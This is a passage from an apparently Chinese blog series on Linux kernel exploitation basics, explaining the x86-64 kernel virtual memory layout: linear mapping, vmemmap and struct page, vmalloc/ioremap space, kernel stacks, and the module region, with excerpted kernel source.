<p>在更改此处内容时，请非常小心 KASLR。KASLR 地址范围不能与任何其他区域重叠，除了 KASAN 阴影区域，因为 KASAN 会禁用 KASLR。</p>
<p>对于 4 级和 5 级布局，最后 2MB 空洞中的 <code>STACKLEAK_POISON</code> 值：<code>ffffffffffffff4111</code></p>
</blockquote>
<p>目前我们常见的都是 4 级页表的内存映射，此时的内存布局如下：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-kernel-pwn-basic-knowlege/images/vmemmap.svg"
                     
                ></p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#define MODULES_VADDR		(__START_KERNEL_map + KERNEL_IMAGE_SIZE)</span><br></pre></td></tr></table></figure></div>

<h3 id="常见内存映射区"><a href="#常见内存映射区" class="headerlink" title="常见内存映射区"></a>常见内存映射区</h3><h4 id="线性映射区"><a href="#线性映射区" class="headerlink" title="线性映射区"></a>线性映射区</h4><p>在Linux内核中，<strong>线性映射区</strong>（Linear Mapping Area）是指一个虚拟内存区域，在该区域内，虚拟地址和物理地址之间建立了直接的、一对一的映射关系。</p>
<p>具体来说，内核将物理内存从地址 <code>0x00000000</code> 开始，线性地映射到内核虚拟地址空间中的一个高端固定地址区间，而这个地址区间的起始位置由内核中的 <code>page_offset_base</code> 变量存储。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-kernel-pwn-basic-knowlege/images/physical_mem.svg"
                     
                ></p>
<p>在 64 位 x86 架构上，不考虑地址随机化的情况下，内核将物理内存从 <code>0x00000000</code> 映射到虚拟地址 <code>0xffff888000000000</code> 开始的一段区域。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> __PAGE_OFFSET_BASE_L4	_AC(0xffff888000000000, UL)</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> page_offset_base __ro_after_init = __PAGE_OFFSET_BASE_L4;</span><br></pre></td></tr></table></figure></div>

<h4 id="虚拟内存映射区域"><a href="#虚拟内存映射区域" class="headerlink" title="虚拟内存映射区域"></a>虚拟内存映射区域</h4><p>在 Linux 内核中，<strong>虚拟内存映射区域</strong>（Virtual Memory Map Area）是指内核虚拟地址空间中专门用于管理和跟踪物理内存页面的一个特定区域。这个区域主要用于存放与每个物理页面对应的 <strong><code>struct page</code></strong> 结构体。通过这种映射，内核能够高效地管理物理内存，包括分配、回收、页面状态跟踪等操作。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-kernel-pwn-basic-knowlege/images/vmemmap_base.svg"
                     
                ></p>
<p><strong><code>vmemmap_base</code></strong> 是虚拟内存映射区域的起始地址，通常该地址为 <code>0xffffea0000000000</code>。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> __VMEMMAP_BASE_L4	0xffffea0000000000UL</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> vmemmap_base __ro_after_init = __VMEMMAP_BASE_L4;</span><br></pre></td></tr></table></figure></div>

<p>其中 <code>page</code> 结构体定义如下（不同版本内核可能有区别）。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> &#123;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> flags;		<span class="comment">/* 原子标志，一些标志可能会异步更新 */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 这个联合体（union）有五个字（20字节/40字节）可用。</span></span><br><span class="line"><span class="comment">     * 警告：第一个字的第0位被用于 PageTail()。这意味着该联合体的其他使用者</span></span><br><span class="line"><span class="comment">     * 必须避免使用该位，以防止与 PageTail() 冲突并产生误报。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span>	<span class="comment">/* 页面缓存和匿名页面 */</span></span><br><span class="line">            <span class="comment">/**</span></span><br><span class="line"><span class="comment">             * @lru: 页面淘汰列表，例如由 zone_lru_lock 保护的 active_list。</span></span><br><span class="line"><span class="comment">             * 有时也被页面所有者用作通用列表。</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">lru</span>;</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">/* 参见 page-flags.h 中的 PAGE_MAPPING_FLAGS */</span></span><br><span class="line">            <span class="class"><span class="keyword">struct</span> <span class="title">address_space</span> *<span class="title">mapping</span>;</span></span><br><span class="line"></span><br><span class="line">            <span class="type">pgoff_t</span> index;		<span class="comment">/* 在映射中的偏移量。 */</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">/**</span></span><br><span class="line"><span class="comment">             * @private: 映射私有的不可见数据。</span></span><br><span class="line"><span class="comment">             * 通常在 PagePrivate 时用于 buffer_heads。</span></span><br><span class="line"><span class="comment">             * 在 PageSwapCache 时用于 swp_entry_t。</span></span><br><span class="line"><span class="comment">             * 在 PageBuddy 时表示伙伴系统中的顺序。</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            <span class="type">unsigned</span> <span class="type">long</span> private;</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span>	<span class="comment">/* slab、slob 和 slub 内存分配器使用 */</span></span><br><span class="line">            <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">                <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">slab_list</span>;</span>	<span class="comment">/* 使用 lru 列表 */</span></span><br><span class="line">                <span class="class"><span class="keyword">struct</span> &#123;</span>	<span class="comment">/* 部分页面 */</span></span><br><span class="line">                    <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">next</span>;</span>	<span class="comment">/* 指向下一个部分页面 */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_64BIT</span></span><br><span class="line">                    <span class="type">int</span> pages;	<span class="comment">/* 剩余页数 */</span></span><br><span class="line">                    <span class="type">int</span> pobjects;	<span class="comment">/* 近似对象数 */</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">                    <span class="type">short</span> <span class="type">int</span> pages;	<span class="comment">/* 剩余页数 */</span></span><br><span class="line">                    <span class="type">short</span> <span class="type">int</span> pobjects;	<span class="comment">/* 近似对象数 */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">                &#125;;</span><br><span class="line">            &#125;;</span><br><span class="line"></span><br><span class="line">            <span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> *<span class="title">slab_cache</span>;</span> <span class="comment">/* 非 slob 分配器使用，指向所属的 slab 缓存 */</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">/* 双字边界对齐 */</span></span><br><span class="line">            <span class="type">void</span> *freelist;		<span class="comment">/* 第一个空闲对象的指针 */</span></span><br><span class="line"></span><br><span class="line">            <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">                <span class="type">void</span> *s_mem;	<span class="comment">/* slab 分配器：指向第一个对象 */</span></span><br><span class="line">                <span class="type">unsigned</span> <span class="type">long</span> counters;		<span class="comment">/* SLUB 分配器的计数器 */</span></span><br><span class="line">                <span class="class"><span class="keyword">struct</span> &#123;</span>			<span class="comment">/* SLUB 分配器的状态 */</span></span><br><span class="line">                    <span class="type">unsigned</span> inuse:<span class="number">16</span>;	<span class="comment">/* 正在使用的对象数 */</span></span><br><span class="line">                    <span class="type">unsigned</span> objects:<span class="number">15</span>;	<span class="comment">/* 总对象数 */</span></span><br><span class="line">                    <span class="type">unsigned</span> frozen:<span class="number">1</span>;	<span class="comment">/* 是否被冻结 */</span></span><br><span class="line">                &#125;;</span><br><span class="line">            &#125;;</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span>	<span class="comment">/* 复合页面的尾页 */</span></span><br><span class="line">            <span class="type">unsigned</span> <span class="type">long</span> compound_head;	<span class="comment">/* 指向复合页面头部的指针，设置了第0位 */</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">/* 仅限第一个尾页 */</span></span><br><span class="line">            <span class="type">unsigned</span> <span class="type">char</span> compound_dtor;	<span class="comment">/* 复合页面的析构函数标志 */</span></span><br><span class="line">            <span class="type">unsigned</span> <span class="type">char</span> compound_order;	<span class="comment">/* 复合页面的阶数 */</span></span><br><span class="line">            <span class="type">atomic_t</span> compound_mapcount;	<span class="comment">/* 复合页面的映射计数 */</span></span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span>	<span class="comment">/* 复合页面的第二个尾页 */</span></span><br><span class="line">            <span class="type">unsigned</span> <span class="type">long</span> _compound_pad_1;	<span class="comment">/* compound_head 的填充 */</span></span><br><span class="line">            <span class="type">unsigned</span> <span class="type">long</span> _compound_pad_2;	<span class="comment">/* 另一部分填充 */</span></span><br><span class="line">            <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">deferred_list</span>;</span>	<span class="comment">/* 延迟处理的页面列表 */</span></span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span>	<span class="comment">/* 页表页面 */</span></span><br><span class="line">            <span class="type">unsigned</span> <span class="type">long</span> _pt_pad_1;	<span class="comment">/* compound_head 的填充 */</span></span><br><span class="line">            <span class="type">pgtable_t</span> pmd_huge_pte; <span class="comment">/* 受 page-&gt;ptl 保护的巨大页表项 */</span></span><br><span class="line">            <span class="type">unsigned</span> <span class="type">long</span> _pt_pad_2;	<span class="comment">/* mapping 的填充 */</span></span><br><span class="line">            <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">                <span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">pt_mm</span>;</span> <span class="comment">/* 仅 x86 页目录使用，指向内存管理结构 */</span></span><br><span class="line">                <span class="type">atomic_t</span> pt_frag_refcount; <span class="comment">/* PowerPC 架构下的页表碎片引用计数 */</span></span><br><span class="line">            &#125;;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> ALLOC_SPLIT_PTLOCKS</span></span><br><span class="line">            <span class="type">spinlock_t</span> *ptl; <span class="comment">/* 分割页锁分配，用于并发保护 */</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">            <span class="type">spinlock_t</span> ptl; <span class="comment">/* 统一页锁，保护页表的访问 */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span>	<span class="comment">/* ZONE_DEVICE 页面 */</span></span><br><span class="line">            <span class="comment">/** @pgmap: 指向宿主设备页面映射的指针。 */</span></span><br><span class="line">            <span class="class"><span class="keyword">struct</span> <span class="title">dev_pagemap</span> *<span class="title">pgmap</span>;</span></span><br><span class="line">            <span class="type">unsigned</span> <span class="type">long</span> hmm_data; <span class="comment">/* 高级内存管理数据 */</span></span><br><span class="line">            <span class="type">unsigned</span> <span class="type">long</span> _zd_pad_1;	<span class="comment">/* 使用 mapping 的填充 */</span></span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/** @rcu_head: 可以通过 RCU 释放页面。 */</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> <span class="title">rcu_head</span>;</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span>		<span class="comment">/* 这个联合体大小为4字节。 */</span></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 如果页面可以映射到用户空间，编码页面表中引用该页面的次数。</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="type">atomic_t</span> _mapcount;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 如果页面既不是 PageSlab 也不可映射到用户空间，</span></span><br><span class="line"><span class="comment">         * 存储在这里的值可能有助于确定该页面的用途。</span></span><br><span class="line"><span class="comment">         * 参见 page-flags.h 中当前存储的页面类型列表。</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">int</span> page_type;</span><br><span class="line"></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">int</span> active;		<span class="comment">/* SLAB 分配器的活动状态 */</span></span><br><span class="line">        <span class="type">int</span> units;			<span class="comment">/* SLOB 分配器的单位数 */</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 使用计数。*不要直接使用*。参见 page_ref.h */</span></span><br><span class="line">    <span class="type">atomic_t</span> _refcount;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_MEMCG</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mem_cgroup</span> *<span class="title">mem_cgroup</span>;</span> <span class="comment">/* 内存控制组，管理页面所属的内存控制组 */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 在所有 RAM 都映射到内核地址空间的机器上，</span></span><br><span class="line"><span class="comment">     * 我们可以简单地计算虚拟地址。在有 highmem 的机器上，</span></span><br><span class="line"><span class="comment">     * 一些内存动态映射到内核虚拟内存，因此我们需要一个地方来存储该地址。</span></span><br><span class="line"><span class="comment">     * 注意，这个字段在 x86 上可能只有16位... ;)</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * 具有慢速乘法的架构可以在 asm/page.h 中定义</span></span><br><span class="line"><span class="comment">     * WANT_PAGE_VIRTUAL</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined(WANT_PAGE_VIRTUAL)</span></span><br><span class="line">    <span class="type">void</span> *virtual;			<span class="comment">/* 内核虚拟地址（如果未 kmapped，则为 NULL，即 highmem） */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* WANT_PAGE_VIRTUAL */</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> LAST_CPUPID_NOT_IN_PAGE_FLAGS</span></span><br><span class="line">    <span class="type">int</span> _last_cpupid; <span class="comment">/* 最近使用该页面的 CPU 的 PID，用于调试和优化 */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125; _struct_page_alignment;</span><br></pre></td></tr></table></figure></div>

<p><strong><code>struct page</code></strong> 结构体是 Linux 内核中用于管理和跟踪物理内存页面的核心数据结构。它在内核的内存管理系统中扮演着关键角色，负责记录每个物理页面的状态、引用计数、映射关系及其他相关信息：</p>
<ul>
<li><strong>页面状态标志管理</strong><ul>
<li>**<code>flags</code>**：存储页面的各种状态标志，如是否被分配、是否可写、是否被锁定等。这些标志通过原子操作更新，确保在多核处理器环境下的线程安全。</li>
</ul>
</li>
<li><strong>引用计数与使用管理</strong><ul>
<li>**<code>_refcount</code>**：跟踪页面的引用计数，决定页面何时可以被回收或重新分配。通过引用计数机制，内核能够有效管理页面的生命周期，防止内存泄漏或重复释放。</li>
<li>**<code>_mapcount</code>**：记录页面在页表中被引用的次数（如果页面可映射到用户空间）。用于管理页面在不同虚拟地址空间中的映射关系，确保页面在被多个进程共享时的正确性。</li>
</ul>
</li>
<li><strong>页面映射与地址空间管理</strong><ul>
<li><strong><code>mapping</code></strong> 和 **<code>index</code>**：指向页面所属的地址空间（如文件系统的地址空间）以及页面在映射中的偏移量。用于定位页面在文件或匿名内存中的具体位置。</li>
<li>**<code>virtual</code>**（可选）：在某些架构上，存储页面在内核虚拟地址空间中的地址，特别是对于 highmem 页面。</li>
</ul>
</li>
<li><strong>内存分配器支持</strong><ul>
<li><strong>Slab、Slob 和 Slub 分配器</strong>：通过 <code>slab_list</code>、<code>freelist</code>、<code>slab_cache</code> 等字段，管理内核内存分配器使用的页面。支持高效的内存分配与回收，优化内存使用和性能。</li>
</ul>
</li>
<li><strong>复合页面管理</strong><ul>
<li><strong>复合页面相关字段</strong>：如 <code>compound_head</code>、<code>compound_dtor</code>、<code>compound_order</code> 和 <code>compound_mapcount</code>，用于管理大页（如 2MB 或 1GB 页）的复合页面。支持页面的聚合与分离，提高大内存页的管理效率。</li>
</ul>
</li>
<li><strong>页表页面管理</strong><ul>
<li><strong>页表页面字段</strong>：通过 <code>pmd_huge_pte</code>、<code>pt_mm</code> 和 <code>pt_frag_refcount</code> 等字段，管理页表自身的页面。确保页表页面的并发访问和一致性，支持多级页表系统的高效运行。</li>
<li><strong>页表锁（<code>ptl</code>）</strong>：用于保护页表的访问，防止并发修改引发的数据竞争。</li>
</ul>
</li>
<li><strong>设备页面管理</strong><ul>
<li><strong>ZONE_DEVICE 页面字段</strong>：通过 <code>pgmap</code> 和 <code>hmm_data</code>，管理设备内存映射页面。支持设备驱动程序的高效内存使用和访问。</li>
</ul>
</li>
<li><strong>RCU 机制支持</strong><ul>
<li>**<code>rcu_head</code>**：允许通过 RCU（Read-Copy-Update）机制安全地延迟释放页面，确保在所有读者完成访问后再进行释放操作，防止数据竞争和内存错误。</li>
</ul>
</li>
<li><strong>内存控制组支持</strong><ul>
<li>**<code>mem_cgroup</code>**：指向页面所属的内存控制组，用于实现内存资源的限制和分配。支持对不同进程组的内存使用进行精细化管理，提高系统资源利用率。</li>
</ul>
</li>
<li><strong>其他辅助功能</strong><ul>
<li>**<code>page_type</code>**：如果页面既不是 PageSlab 也不可映射到用户空间，用于存储页面的类型，辅助确定页面的用途。</li>
<li><strong><code>active</code></strong> 和 **<code>units</code>**：用于 SLAB 和 SLOB 分配器，记录页面的活动状态和分配单位数。</li>
</ul>
</li>
</ul>
<h4 id="vmalloc-ioremap-space"><a href="#vmalloc-ioremap-space" class="headerlink" title="vmalloc&#x2F;ioremap space"></a>vmalloc&#x2F;ioremap space</h4><p><strong>vmalloc&#x2F;ioremap space</strong> 是 Linux 内核中的一个专用虚拟地址空间，主要用于内核通过 <code>vmalloc</code> 和 <code>ioremap</code> 函数进行内存映射时，映射非连续的物理内存块。这一地址空间为内核提供了一个连续的虚拟地址区域，便于访问那些在物理内存中不连续的内存区域或设备内存。</p>
<ul>
<li>**<code>vmalloc space</code>**：用于 <code>vmalloc</code> 动态分配大块内存，尤其是在物理内存碎片较多时，无法找到连续的物理页面。</li>
<li>**<code>ioremap space</code>**：用于将 I&#x2F;O 设备（如网卡、显卡等）的物理内存地址映射到内核的虚拟地址空间，便于内核直接操作设备内存。</li>
</ul>
<p><strong><code>vmalloc_base</code></strong> 是 <code>vmalloc/ioremap space</code> 的起始地址，通常该地址为 <code>0xffffc90000000000</code>。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> __VMALLOC_BASE_L4	0xffffc90000000000UL</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> vmalloc_base __ro_after_init = __VMALLOC_BASE_L4;</span><br></pre></td></tr></table></figure></div>

<p>值得一提是，如启用了 <code>CONFIG_VMAP_STACK</code>（默认启用），内核栈通过 <code>vmalloc</code> 动态分配，存放在 <code>vmalloc/ioremap space</code> 中。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">unsigned</span> <span class="type">long</span> *<span class="title function_">alloc_thread_stack_node</span><span class="params">(<span class="keyword">struct</span> task_struct *tsk, <span class="type">int</span> node)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_VMAP_STACK</span></span><br><span class="line">	<span class="type">void</span> *<span class="built_in">stack</span>;</span><br><span class="line">	<span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 尝试从 CPU 缓存的栈列表中获取一个空闲的栈</span></span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; NR_CACHED_STACKS; i++) &#123;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">vm_struct</span> *<span class="title">s</span>;</span></span><br><span class="line"></span><br><span class="line">		<span class="comment">// 通过原子交换方式获取缓存栈</span></span><br><span class="line">		s = this_cpu_xchg(cached_stacks[i], <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (!s)</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* 清除复用栈中的过时指针 */</span></span><br><span class="line">		<span class="built_in">memset</span>(s-&gt;addr, <span class="number">0</span>, THREAD_SIZE);</span><br><span class="line"></span><br><span class="line">		<span class="comment">// 设置任务的栈虚拟内存区域和栈地址</span></span><br><span class="line">		tsk-&gt;stack_vm_area = s;</span><br><span class="line">		tsk-&gt;<span class="built_in">stack</span> = s-&gt;addr;</span><br><span class="line">		<span class="keyword">return</span> s-&gt;addr;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * 如果没有找到缓存栈，则通过 vmalloc 分配一个新的栈。</span></span><br><span class="line"><span class="comment">	 * 分配的栈会被缓存并在后续线程中复用，</span></span><br><span class="line"><span class="comment">	 * 因此需要手动进行内存控制组（memcg）计数。</span></span><br><span class="line"><span class="comment">	 * 这里去掉了 __GFP_ACCOUNT 标志，避免内存分配计入 memcg。</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="built_in">stack</span> = __vmalloc_node_range(THREAD_SIZE, THREAD_ALIGN,</span><br><span class="line">				     VMALLOC_START, VMALLOC_END,</span><br><span class="line">				     THREADINFO_GFP &amp; ~__GFP_ACCOUNT,</span><br><span class="line">				     PAGE_KERNEL,</span><br><span class="line">				     <span class="number">0</span>, node, __builtin_return_address(<span class="number">0</span>));</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * 在中断上下文中不能调用 find_vm_area()，</span></span><br><span class="line"><span class="comment">	 * 因为 free_thread_stack() 可能在中断上下文中被调用，</span></span><br><span class="line"><span class="comment">	 * 所以我们将 vm_struct 进行缓存。</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">stack</span>) &#123;</span><br><span class="line">		<span class="comment">// 查找并记录分配的虚拟内存区域</span></span><br><span class="line">		tsk-&gt;stack_vm_area = find_vm_area(<span class="built_in">stack</span>);</span><br><span class="line">		tsk-&gt;<span class="built_in">stack</span> = <span class="built_in">stack</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">stack</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">	<span class="comment">// 如果没有启用 vmap 栈，使用传统的页分配方法来分配栈</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span> =</span> alloc_pages_node(node, THREADINFO_GFP,</span><br><span class="line">					     THREAD_SIZE_ORDER);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 如果分配成功，返回栈的虚拟地址</span></span><br><span class="line">	<span class="keyword">return</span> page ? page_address(page) : <span class="literal">NULL</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>


  <div class="note-large red">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>注意</p>

    </div>
    <div class="notel-content">
      <p>不是所有内核线程的栈都在 <code>vmalloc/ioremap space</code> 范围，比如在内核启动时，内核的第一个线程（通常是 <code>swapper</code> 或 <code>init</code> 线程）会使用 <code>init_stack</code> 来执行一些初始化工作。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="type">unsigned</span> <span class="type">long</span> init_stack[THREAD_SIZE / <span class="keyword">sizeof</span>(<span class="type">unsigned</span> <span class="type">long</span>)];</span><br></pre></td></tr></table></figure></div>
    </div>
  </div>

<h4 id="内核模块区"><a href="#内核模块区" class="headerlink" title="内核模块区"></a>内核模块区</h4><p>内核模块区是 Linux 内核中用于映射内核模块的区域，起始地址为 <code>0xffffffff80000000 + 1024 * 1024 * 1024 = 0xffffffffc0000000</code>，结束地址为 <code>0xffffffffff000000</code>。</p>
